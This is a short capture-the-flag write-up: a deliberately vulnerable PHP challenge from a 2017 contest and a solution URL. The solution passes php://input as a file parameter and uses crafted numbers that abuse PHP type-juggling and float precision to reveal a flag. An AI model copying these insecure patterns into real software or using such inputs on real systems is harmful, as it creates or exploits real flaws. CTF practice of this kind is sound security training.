# Challenge 
```php 
<?php	
	@$k1=$_GET['key1'];
	@$k2=$_GET['key2'];
	if(@file_get_contents($k1)==="Hello hacker!"){
		echo 'welcome! Hacker!<br>';
		if(md5($k2)>666666*666666)
		{
			include('ctf.php'); 
			@$k3=$_GET['key3'];
			@$k4=$_GET['key4'];
			if(intval($k3)<666)
			{
				if($k3==666)
				{
					echo 'Come on, flag is coming<br>';
					if($k4>0)
					{
						if(intval($k3+$k4)<666)
							echo $flag;
					}
				}
			}else{
				exit();
			}
		}else{
			exit();
		}
	}else{
		exit();
	}

?>
```

# Solution 
```
URL: http://127.0.0.1:2500/index.php?key1=php://input&key2=566170&key3=665.999999999999944&key4=8589934591

POST:Hello hacker!
```
# Refference
+ 2017 年美亚柏科邀请赛